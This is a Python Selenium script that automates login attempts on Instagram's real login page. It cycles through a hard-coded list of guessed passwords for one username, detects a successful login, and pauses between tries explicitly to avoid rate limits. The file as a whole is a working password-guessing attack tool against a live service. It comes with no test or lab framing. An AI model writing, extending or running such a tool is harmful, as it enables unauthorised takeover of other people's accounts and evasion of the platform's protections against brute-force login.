from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import time

# List of username/password combinations to try
CREDENTIALS = [
    {"username": "suriya", "password": "suriya123"},
    {"username": "suriya", "password": "suriya"},
    {"username": "suriya", "password": "password123"},
    # Add more credentials as needed
]

def attempt_login(driver, username, password):
    try:
        # Wait for username field to be present
        username_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "username"))
        )

        # Wait for password field to be present
        password_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "password"))
        )

        # Clear and enter credentials
        username_input.clear()
        password_input.clear()
        username_input.send_keys(username)
        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)

        # Wait for success or failure message
        result = WebDriverWait(driver, 10).until(
            lambda d: d.find_elements(By.XPATH, "//*[contains(text(), 'Not Now')]") or
                      d.find_elements(By.ID, "slfErrorAlert") or
                      d.find_elements(By.XPATH, "//*[contains(text(), 'Sorry')]")
        )

        # Check if login was successful
        if driver.find_elements(By.XPATH, "//*[contains(text(), 'Not Now')]"):
            return True  # Logged in successfully
        else:
            return False  # Login failed

    except Exception as e:
        print(f"Error during login attempt: {e}")
        return False

def main():
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

    try:
        driver.get("https://www.instagram.com/accounts/login/")

        # Wait for login page to load
        WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.NAME, "username"))
        )

        for cred in CREDENTIALS:
            print(f"Trying username: {cred['username']} with password: {cred['password']}")

            if attempt_login(driver, cred['username'], cred['password']):
                print(f"✅ Successfully logged in as {cred['username']}!")

                time.sleep(5)  # Let it settle
                input("Press Enter to keep browser open and end script...")
                return
            else:
                print("❌ Login failed. Trying next...")

                time.sleep(5)  # Prevent rate limits
                driver.get("https://www.instagram.com/accounts/login/")

        print("⚠️ All login attempts failed.")

    finally:
        driver.quit()  # You can comment this if you want to keep browser open

if __name__ == "__main__":
    main()
